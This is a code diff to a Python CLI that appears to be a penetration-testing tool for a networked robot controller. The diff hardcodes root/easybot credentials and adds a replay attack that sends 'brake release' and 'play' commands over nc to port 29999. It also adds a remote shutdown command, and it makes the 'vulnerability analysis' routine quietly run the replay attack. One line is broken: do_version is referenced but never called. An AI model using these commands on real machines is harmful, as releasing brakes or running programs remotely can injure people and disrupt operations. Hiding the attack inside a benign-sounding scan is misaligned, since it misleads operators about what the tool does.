@@ -5,6 +5,7 @@ import cmd
 import subprocess
 import json
 import re
+import time
 
 
 class Parser():
@@ -25,21 +26,38 @@ class CLI(cmd.Cmd):
     target_ip = "0.0.0.0"
     target_user = "root"
     target_pass = "easybot"
+    target_pass_default = "easybot"
+    score = 10.0
+
+    def update_score(self, delta):
+        self.score = self.score + delta
+        return self.score
+
+    def replay(self, cycles):
+        for i in range(cycles):
+            os.system(f"echo brake release | nc {self.target_ip} 29999")
+            time.sleep(30)
+            os.system(f"echo play | nc {self.target_ip} 29999")
 
     def do_version(self, line):
         """version checker"""
         with open('./Versions.json') as f:
             data = json.load(f)
         for key, value in data.items():
-            command = "sshpass -p "+self.target_pass+" ssh -t "+self.target_user + "@"+self.target_ip+" "+data[key]["version_cmd"]
+            command = "sshpass -p "+self.target_pass+" ssh -t " + \
+                self.target_user + "@"+self.target_ip + \
+                " "+data[key]["version_cmd"]
             result = subprocess.getoutput(command)
             result = result.replace(self.target_ip, "")
             x = re.search(data[key]["regex"], result)
             try:
-                if Parser.Semantic_version_checker(x.group(), data[key]["safe_version"]):
+                if Parser.Semantic_version_checker(
+                        x.group(), data[key]["safe_version"]):
                     print(key+" "+x.group())
                 else:
-                    print('\x1b[2;30;41m' + key + " " + x.group() + " " + '\x1b[0m')
+                    self.update_score(-0.5)
+                    print('\x1b[2;30;41m' + key + " " +
+                          x.group() + " " + '\x1b[0m')
             except Exception:
                 print(key + " COULD NOT BE FOUND")
 
@@ -59,9 +77,22 @@ class CLI(cmd.Cmd):
         """sets the user for target"""
         self.target_user = line.strip()
 
+    def do_shutdown(self, line):
+        """Shutsdown the target"""
+        os.system(f"echo shutdown | nc {self.target_ip} 29999")
+
+    def do_replay(self, line):
+        """runs a replay attack if target in remote"""
+        cycles = int(
+            input("How long do you want run replay attack (in minutes): "))*2
+        self.replay(cycles)
+
     def do_vul_analysis(self, line):
         """runs a simple vulnerability analysis"""
-        os.system("nmap "+self.target_ip + " -p-")
+        self.score = 10
+        self.do_version
+        self.replay(2)
+        os.system("nmap "+self.target_ip + "")
 
     def do_quit(self, line):
         """Exit the CLI."""
